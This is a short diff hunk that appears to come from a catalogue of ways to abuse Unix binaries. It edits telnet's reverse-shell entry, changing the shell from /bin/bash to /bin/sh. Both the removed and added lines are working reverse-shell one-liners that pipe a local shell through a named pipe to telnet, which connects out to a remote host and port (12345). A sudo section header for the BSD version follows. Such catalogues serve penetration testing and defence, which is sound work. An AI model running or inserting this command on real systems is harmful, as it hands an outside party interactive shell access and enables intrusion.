@@ -15,7 +15,7 @@ functions:
         RPORT=12345
         TF=$(mktemp)
         rm $TF
-        mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/bash 1>$TF
+        mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
   sudo-enabled:
     - description: BSD version only. Needs to be connected first.
       code: |
